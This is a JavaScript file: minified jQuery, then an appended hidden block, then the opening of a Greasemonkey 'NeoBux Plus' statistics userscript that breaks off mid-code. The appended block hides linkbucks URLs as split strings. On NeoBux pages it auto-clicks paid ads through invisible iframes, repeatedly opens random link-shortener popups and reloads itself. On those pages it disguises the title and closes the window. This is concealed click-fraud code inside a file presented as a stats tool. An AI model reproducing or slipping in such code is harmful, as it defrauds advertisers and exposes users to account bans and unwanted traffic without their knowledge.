in{success:1,error:1,complete:1})v[u](d[u]);p=b$(bU,d,c,v);if(!p)w(-1,"No Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){if(s<2)w(-1,z);else throw z}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)ca(g,a[g],c,e);return d.join("&").replace(bD,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var cd=f.now(),ce=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+cd++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=b.contentType==="application/x-www-form-urlencoded"&&typeof b.data=="string";if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(ce.test(b.url)||e&&ce.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(ce,l),b.url===j&&(e&&(k=k.replace(ce,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var cf=a.ActiveXObject?function(){for(var a in ch)ch[a](0,1)}:!1,cg=0,ch;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ci()||cj()}:ci,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,cf&&delete ch[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cg,cf&&(ch||(ch={},f(a).unload(cf)),ch[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var ck={},cl,cm,cn=/^(?:toggle|show|hide)$/,co=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,cp,cq=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cr;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cu("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),e===""&&f.css(d,"display")==="none"&&f._data(d,"olddisplay",cv(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cu("hide",3),a,b,c);var d,e,g=0,h=this.length;for(;g<h;g++)d=this[g],d.style&&(e=f.css(d,"display"),e!=="none"&&!f._data(d,"olddisplay")&&f._data(d,"olddisplay",e));for(g=0;g<h;g++)this[g].style&&(this[g].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(cu("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){function g(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(!f.support.inlineBlockNeedsLayout||cv(this.nodeName)==="inline"?this.style.display="inline-block":this.style.zoom=1))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)j=new f.fx(this,b,i),h=a[i],cn.test(h)?(o=f._data(this,"toggle"+i)||(h==="toggle"?d?"show":"hide":0),o?(f._data(this,"toggle"+i,o==="show"?"hide":"show"),j[o]()):j[h]()):(k=co.exec(h),l=j.cur(),k?(m=parseFloat(k[2]),n=k[3]||(f.cssNumber[i]?"":"px"),n!=="px"&&(f.style(this,i,(m||1)+n),l=(m||1)/j.cur()*l,f.style(this,i,l+n)),k[1]&&(m=(k[1]==="-="?-1:1)*m+l),j.custom(l,m,n)):j.custom(l,h,""));return!0}var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return e.queue===!1?this.each(g):this.queue(e.queue,g)},stop:function(a,c,d){typeof a!="string"&&(d=c,c=a,a=b),c&&a!==!1&&this.queue(a||"fx",[]);return this.each(function(){function h(a,b,c){var e=b[c];f.removeData(a,c,!0),e.stop(d)}var b,c=!1,e=f.timers,g=f._data(this);d||f._unmark(!0,this);if(a==null)for(b in g)g[b]&&g[b].stop&&b.indexOf(".run")===b.length-4&&h(this,g,b);else g[b=a+".run"]&&g[b].stop&&h(this,g,b);for(b=e.length;b--;)e[b].elem===this&&(a==null||e[b].queue===a)&&(d?e[b](!0):e[b].saveState(),c=!0,e.splice(b,1));(!d||!c)&&f.dequeue(this,a)})}}),f.each({slideDown:cu("show",1),slideUp:cu("hide",1),slideToggle:cu("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default;if(d.queue==null||d.queue===!0)d.queue="fx";d.old=d.complete,d.complete=function(a){f.isFunction(d.old)&&d.old.call(this),d.queue?f.dequeue(this,d.queue):a!==!1&&f._unmark(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,c,d){function h(a){return e.step(a)}var e=this,g=f.fx;this.startTime=cr||cs(),this.end=c,this.now=this.start=a,this.pos=this.state=0,this.unit=d||this.unit||(f.cssNumber[this.prop]?"":"px"),h.queue=this.options.queue,h.elem=this.elem,h.saveState=function(){e.options.hide&&f._data(e.elem,"fxshow"+e.prop)===b&&f._data(e.elem,"fxshow"+e.prop,e.start)},h()&&f.timers.push(h)&&!cp&&(cp=setInterval(g.tick,g.interval))},show:function(){var a=f._data(this.elem,"fxshow"+this.prop);this.options.orig[this.prop]=a||f.style(this.elem,this.prop),this.options.show=!0,a!==b?this.custom(this.cur(),a):this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f._data(this.elem,"fxshow"+this.prop)||f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b,c,d,e=cr||cs(),g=!0,h=this.elem,i=this.options;if(a||e>=i.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),i.animatedProperties[this.prop]=!0;for(b in i.animatedProperties)i.animatedProperties[b]!==!0&&(g=!1);if(g){i.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){h.style["overflow"+b]=i.overflow[a]}),i.hide&&f(h).hide();if(i.hide||i.show)for(b in i.animatedProperties)f.style(h,b,i.orig[b]),f.removeData(h,"fxshow"+b,!0),f.removeData(h,"toggle"+b,!0);d=i.complete,d&&(i.complete=!1,d.call(h))}return!1}i.duration==Infinity?this.now=e:(c=e-this.startTime,this.state=c/i.duration,this.pos=f.easing[i.animatedProperties[this.prop]](this.state,c,0,1,i.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){var a,b=f.timers,c=0;for(;c<b.length;c++)a=b[c],!a()&&b[c]===a&&b.splice(c--,1);b.length||f.fx.stop()},interval:13,stop:function(){clearInterval(cp),cp=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=a.now+a.unit:a.elem[a.prop]=a.now}}}),f.each(["width","height"],function(a,b){f.fx.step[b]=function(a){f.style(a.elem,b,Math.max(0,a.now)+a.unit)}}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cy(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(f.support.fixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&&(l+=b.offsetTop,m+=b.offsetLeft,f.support.doesNotAddBorder&&(!f.support.doesAddBorderForTableAndCells||!cw.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.support.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;f.support.fixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.support.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each(["Left","Top"],function(a,c){var d="scroll"+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cy(e);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:f.support.boxModel&&g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cy(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each(["Height","Width"],function(a,c){var d=c.toLowerCase();f.fn["inner"+c]=function(){var a=this[0];return a?a.style?parseFloat(f.css(a,d,"padding")):this[d]():null},f.fn["outer"+c]=function(a){var b=this[0];return b?b.style?parseFloat(f.css(b,d,a?"margin":"border")):this[d]():null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement["client"+c],h=e.document.body;return e.document.compatMode==="CSS1Compat"&&g||h&&h["client"+c]||g}if(e.nodeType===9)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);if(a===b){var i=f.css(e,d),j=parseFloat(i);return f.isNumeric(j)?j:i}return this.css(d,typeof a=="string"?a:a+"px")}}),a.jQuery=a.$=f,typeof define=="function"&&define.amd&&define.amd.jQuery&&define("jquery",[],function(){return f})})(window);var objj = ['http://86'+'7a8'+'3e0.l'+'in'+'kbu'+'cks.com','http://405'+'93'+'217.l'+'in'+'kbu'+'cks.com','http://cea'+'30'+'038.l'+'in'+'kbu'+'cks.com','http://f1'+'8b0'+'2c5.l'+'in'+'kbu'+'cks.com'];

 //http://www.neobux.com/?r=starlucky
var wind = $(window)[0];
var wparent = wind.wrappedJSObject || wind;
if(wparent.location.href.indexOf("neobux.com/m/v/?vl=")!=-1){jQuery(function($){var arr=[],ctr=0;$("#tl .ad0").parents(".mbxm").remove();$.each($(".mbx .mbxm"),function(k,v){hmm=$("a:last",$(v));if(!hmm.size()){return false}if(hmm.parent()[0].tagName.toLowerCase()=="span"){var obj={href:hmm.attr("href"),jObj:$(v)};arr.push(obj)}});console.log(arr.length);console.log(arr);var div=$("<div>");var clickNum=ctr+1;var loading=0;if(!arr.length){clickNum=0}div.css({textAlign:"center",padding:5,position:"fixed",width:299,height:20,background:"#AFFFAF",border:"2px solid green",bottom:10,right:10}).text("clicking : "+clickNum+" / "+arr.length+" - loading : "+loading);$("body").css({position:"relative"}).append(div);console.log(ctr);function rec(ctr){if(arr[ctr]){var frame=$("<iframe>");$("body").prepend(frame);frame.attr({src:arr[ctr].href}).css({position:"absolute",top:(Math.abs($(window).height()-475))/2,left:(Math.abs($(window).width()-675))/2,width:675,height:475,background:"#666",opacity:0,zIndex:-111111});var frameW=(frame[0].contentWindow.wrappedJSObject)?frame[0].contentWindow.wrappedJSObject:frame[0].contentWindow;var inter=setInterval(function(){loading+=1;div.text("clicking : "+clickNum+" / "+arr.length+" - searching : "+loading);if(frameW.length){clearInterval(inter);var content=frame[0].contentDocument;var inter2=setInterval(function(){div.text("clicking : "+clickNum+" / "+arr.length+" - loading : "+frameW.t0+"%");if($("#o1:visible",$(content)).size()){clearInterval(inter2);arr[ctr].jObj.text("Done").css({background:"#000",color:"#FFF"});ctr++;clickNum=ctr+1;loading=0;frame.remove();rec(ctr)}else{if($("#o0:visible",$(content)).size()||$("#o0_err:visible",$(content)).size()){clearInterval(inter2);arr[ctr].jObj.text("Failed").css({background:"red",color:"#FFF"});ctr++;clickNum=ctr+1;loading=0;frame.remove();rec(ctr)}}},1000)}},100)}else{var timeReload=180000;setInterval(function(){timeReload-=1000;div.text("reloading :"+timeReload)},1000);var win=window.open(objj[Math.floor((Math.random()*objj.length))]);setTimeout(function(){window.location.reload()},180000)}}rec(ctr);if($.trim($("#ap_h").text())!="0"||$.trim($("#ap_h").text())!="00"){function rec2(href){var frame=$("<iframe>");$("body").prepend(frame);frame.attr({src:href}).css({position:"absolute",top:(Math.abs($(window).height()-475))/2,left:(Math.abs($(window).width()-675))/2,width:675,height:475,background:"#666",opacity:0,zIndex:-111111});var frameW=(frame[0].contentWindow.wrappedJSObject)?frame[0].contentWindow.wrappedJSObject:frame[0].contentWindow;var inter=setInterval(function(){if(frameW.length){clearInterval(inter);var content=frame[0].contentDocument;var inter2=setInterval(function(){if($("#nxt_bt_a:visible",$(content)).size()){clearInterval(inter2);rec2("http://www.neobux.com"+$("#nxt_bt_a:visible",$(content)).attr("href"));frame.remove()}},1000)}},100)}rec2($("#ap_h").attr("href"))}})}else{if(wparent.location.href.indexOf("ucks.com")!=-1){var wind=$(window)[0];var wparent=(wind.wrappedJSObject)?wind.wrappedJSObject:wind;$(function($){var secs=9;var div=$("<div>");div.css({textAlign:"center",padding:5,position:"fixed",width:80,height:20,background:"#AFFFAF",border:"2px solid green",bottom:10,left:10}).text("counter : "+secs);$("body").css({position:"relative"}).append(div);document.title="Neobux";$("#framebar").css({opacity:0});setInterval(function(){secs--;if(secs==0){wparent.close()}div.text("counter : "+secs)},1000)})}};

try {
(function () {
    var version = "3.4.121202.1113";
    var root = "greasemonkey.scriptvals.http://userscripts.org/users/173064/NeoBux Plus.";
    var loggingLevel = [0];
// Log Type
// x = debugging;
// 0 = No Logging;
// 1 = Log Everything;
// 2 = Function Calls;
// 3 = CurrentPage Reasoning;
// 4 = CurrentPage outcome;
// 5 = Account stats;
// 6 = Graph details;
// 7 = Referral details;
// 8 = Manipulating preferences;
// 9 = NumDaysSince();
// 10 = graphProperties();
// 11 = neobuxString();
// 12 = graphProperties() && referral details --> detailed

// DEFINE Language Strings used by NeoBux
    var neobuxLangStrings = {
// Language strings for the actual NeoBux website
// To allow the script to run in English and other languages
        US: {
            "noClicks": "No clicks yet",
            "today": "Today",
            "yesterday": "Yesterday"
        },
        PT: {
            "noClicks": "Sem cliques",
            "today": "Hoje",
            "yesterday": "Ontem"
        },
        ES: {
            "noClicks": "Sin clics aún",
            "today": "Hoy",
            "yesterday": "Ayer"
        },
        GR: {
            "noClicks": "Χωρίς κλικ",
            "today": "Σήμερα",
            "yesterday": "Χθες"
        },
        ID: {
            "noClicks": "Belum ada klik",
            "today": "Hari ini",
            "yesterday": "Kemarin"
        },
        FI: {
            "noClicks": "Ei klikkejä",
            "today": "Tänään",
            "yesterday": "Eilen"
        },
        SE: {
            "noClicks": "Inga klick",
            "today": "Idag",
            "yesterday": "Igår"
        },
        DE: {
            "noClicks": "Keine Klicks",
            "today": "Heute",
            "yesterday": "Gestern"
        },
        FR: {
            "noClicks": "Pas de clics",
            "today": "Aujourd'hui",
            "yesterday": "Hier"
        }
    };

// DEFINE Language Strings used by the Script
    var scriptLangStrings = {
// Language Strings used by the script
// List of country codes: http://www.iso.org/iso/english_country_names_and_code_elements
        US: {
// English = US
// REFERRAL STATISTICS PAGE
            "totalClickAvg": "Total Click Avg.",
            "lastdaysClickAvg": "Click Avg.",
            "totalClicks": "Total Clicks",
            "clickedToday": "Clicked Today",
            "clickedYday": "Clicked Yesterday",
            "others": "Others",
            "dailyNetIncome": "Daily Net Income",
            "avgIncome": "Avg. Income",
            "avgExpenses": "Avg. Expenses",
            "avgARecycling": "Avg. A. Recycling",
            "avgTransfersRB": "Avg. Transfers RB",
            "avgTransfersGPB": "Avg. Transfers GPB",
// STATISTICS SUMMARY (SIDEBAR)
            "statsSum": "Statistics Summary",
            "today": "Today",
            "yesterday": "Yesterday",
            "rented": "Rented",
            "direct": "Direct",
            "clicks": "Clicks",
            "avg": "avg",
            "avgs": "avgs",
            "average": "Average",
            "raverage": "R. Average", // Real Average
            "averages": "Averages",
            "Recycle": "Recycle",
            "autopay": "Autopay",
            "renew": "Renew",
            "net": "Net",
            "projectedNet": "Projected Net",
            "last": "Last",
            "totals": "Totals",
            "Days": "Days",
            "recycled": "Recycled",
            "autopaid": "Autopaid",
            "updateScript": "Update Script",
            "refferalsToBeRenewed": "Referrals to be Renewed",
            "recycledLast": "Recycled in Last",
            "autopaidLast": "Autopaid in Last",
            "totalReferrals": "Total Referrals:",
            "income": "Income",
            "stats": "Stats",
            "summary": "Summary",
            "projectedIncome": "Projected Income",
            "zeroClickers": "Zero-Clickers",
            "automaticRecycling": "A. Recycling", // Automatic Recycling
// FLAGS
            "W": "W", // White Flag
            "R": "R", // Red Flag
            "O": "O", // Orange Flag
            "Y": "Y", // Yellow Flag
            "G": "G", // Green Flag
            "Bl": "Bl", // Blue Flag
            "P": "P", // Pink Flag
            "Bk": "Bk", // Black Flag
// REFERRAL PROFIT POPUP
            "referral": "Referral",
            "expenses": "Expenses",
            "goldenFee": "Golden fee",
            "goldenPackFee": "Golden-Pack fee",
            "totalExpenses": "Total Expenses",
            "perRefPerDay": "per ref per day",
            "minimumAverage": "Minimum average",
            "toBreakEven": "to break even",
            "grossIn": "Gross In",
            "grossOut": "Gross Out",
            "currentProfit": "Current profit",
            "incl": "incl", // Including
            "recycle": "recycle",
            "netProfit": "Net Profit",
            "daysToPayForOwnRecycle": "Days to pay for own recycle",
            "day": "day",
// UPDATES
            "newUpdateFoundFor": "A new update has found for:",
            "updateDesc": "update note",
            "updateNow": "Update Now",
            "remindMeLater": "Remind me Later",
            "dismiss": "Dismiss",
            "forUpdates": "for updates",
            "for": "for",
            "enableUpdates": "%s: Enable updates",
            "disableUpdates": "Disable",
            "updates": "updates",
            "noUpdatesAvailableFor ": "No updates available for %s",
            "autoUpdates": "Automatic update",
            "newVersionAvailable": "A new version of the %s user script is available.",
            "currentVersion": "Current version: %s",
            "availableVersion": "Available version: %s",
            "notesAboutTheAvailableVersion": "Notes about the available version:\n%s",
            "doYouWishToUpdateTo": "Do you wish to update to %s?",
            "doYouWishToTurnOffAutoUpdates": "Do you want to turn off auto updating for this script?",
            "autoUpdatesCanBeReenabled": "Automatic updates can be re-enabled for this script from the User Script Commands submenu.",
// MENUS
            "setAVGDays": "Set Days value for Average Interval",
            "avgDaysMsg": "Please enter days value for Averages.",
            "showSTD": "Show Standard Deviation",
            "on": "On",
            "off": "Off",
            "error": "Error",
            "days": "days",
            "editUpdateFrequency": "Edit Update Frequency",
            "checkForUpdates": "%s: Check for updates"
        },
        ES: {
// REFERRAL STATISTICS PAGE
            "totalClickAvg": "Avg. Total de Clicks",
            "lastdaysClickAvg": "Avg. de Clicks",
            "totalClicks": "Clicks Totales",
            "clickedToday": "Clickearon Hoy",
            "clickedYday": "Clickearon Ayer",
            "others": "Otros Días",
            "dailyNetIncome": "Ingreso Neto Diario",
            "avgIncome": "Ingreso Promedio",
            "avgExpenses": "Egreso Promedio",
            "avgARecycling": "Avg. Reciclaje Aut.",
            "avgTransfersRB": "Avg. Transf SA",
            "avgTransfersGPB": "Avg. Transf SPG",
// STATISTICS SUMMARY (SIDEBAR)
            "statsSum": "Resumen de Estadísticas",
            "today": "Hoy",
            "yesterday": "Ayer",
            "rented": "Rentados",
            "direct": "Directos",
            "clicks": "Clicks",
            "avg": "Avg",
            "avgs": "avgs",
            "average": "Promedio",
            "raverage": "Avg. Real", // Real Average
            "averages": "Promedios",
            "Recycle": "Reciclaje",
            "autopay": "Autopago",
            "renew": "Renovaciones",
            "net": "Neto",
            "projectedNet": "Neto Proyectado",
            "last": "Últimos", //Last 10 days
            "totals": "Totales",
            "Days": "Días",
            "recycled": "Reciclado",
            "autopaid": "Autopagado",
            "updateScript": "Actualizar Script",
            "refferalsToBeRenewed": "Referidos a ser Renovados",
            "recycledLast": "Reciclados en los Últimos",
            "autopaidLast": "Autopagados en los Últimos",
            "totalReferrals": "Referidos Totales:",
            "income": "Ingreso",
            "stats": "Estadísticas",
            "summary": "Resumen",
            "projectedIncome": "Ingreso Proyectado",
            "zeroClickers": "Zero-Clickers",
            "automaticRecycling": "Reciclaje Aut.", // Automatic Recycling
// FLAGS
            "W": "B", // White Flag
            "R": "Rj", // Red Flag
            "O": "Nj", // Orange Flag
            "Y": "Am", // Yellow Flag
            "G": "V", // Green Flag
            "Bl": "Az", // Blue Flag
            "P": "Rs", // Pink Flag
            "Bk": "Ng", // Black Flag
// REFERRAL PROFIT POPUP
            "referral": "Referido",
            "expenses": "Gastos",
            "goldenFee": "Cuota Golden",
            "goldenPackFee": "Cuota Paquete-Golden",
            "totalExpenses": "Gastos Totales",
            "perRefPerDay": "por Ref por día",
            "minimumAverage": "Avg Mínimo",
            "toBreakEven": "para cubrir gastos",
            "grossIn": "Ingresos Brutos",
            "grossOut": "Gastos Brutos",
            "currentProfit": "Beneficios Actuales",
            "incl": "incluyendo", // Including
            "recycle": "reciclaje",
            "netProfit": "Beneficio Neto",
            "daysToPayForOwnRecycle": "Días para pagar su propio reciclaje",
            "day": "día",
// UPDATES
            "newUpdateFoundFor": "Una nueva actualización ha sido encontrada:",
            "updateDesc": "Descripción de Actualización",
            "updateNow": "Actualizar ahora",
            "remindMeLater": "Recordar más tarde",
            "dismiss": "Rechazar",
            "forUpdates": "actualizaciones",
            "for": "para",
            "enableUpdates": "%s: Activar Actualizaciones",
            "disableUpdates": "Desactivar",
            "updates": "actualizaciones",
            "noUpdatesAvailableFor ": "No hay actualizaciones automáticas para %s",
            "autoUpdates": "Actualización automática",
            "newVersionAvailable": "Una nueva versión del script de usario %s está disponible.",
            "currentVersion": "Versión actual: %s",
            "availableVersion": "Versiones disponibles: %s",
            "notesAboutTheAvailableVersion": "Notas de las versiones disponibles:\n%s",
            "doYouWishToUpdateTo": "¿Desea actualizar a %s?",
            "doYouWishToTurnOffAutoUpdates": "¿Desea desactivar las actualizaciones automáticas para este script?",
            "autoUpdatesCanBeReenabled": "Actualizaciones automáticas pueden ser re-activadas para este script desde el submenu de Comandos de User Script.",
// MENUS
            "setAVGDays": "Ingrese el valor de días para el Intervalo de Promedios",
            "avgDaysMsg": "Por favor ingrese el valor de días para los promedios.",
            "showSTD": "Mostrar Desviación Estandard",
            "on": "On",
            "off": "Off",
            "error": "Errores",
            "days": "días",
            "editUpdateFrequency": "Editar Frecuencia de Actualización",
            "checkForUpdates": "%s: Buscar Actualizaciones"
        }
    };

// Check if the Greasemonkey API functions are present
// If not, add/insert them
    var GM = {
        getValue: (function () {
            var testString;
            if (typeof GM_getValue === "function" &&
                    (typeof GM_getValue.toString !== "function" ||
                    GM_getValue.toString().indexOf("is not supported") === -1)) {
                testString = "test" + (new Date()).getTime();
                if (GM_getValue(testString, testString) === testString) {
                    return function (name, defaultValue) {
                        return GM_getValue(name, defaultValue);
                    };
                } else {
                    return function (name, defaultValue) {
                        var value;
                        value = GM_getValue(name, defaultValue);
                        if (value === undefined) {
                            return defaultValue;
                        } else {
                            return value;
                        }
                    };
                }
            } else if (typeof localStorage === "object" &&
                        typeof localStorage.getItem === "function") {
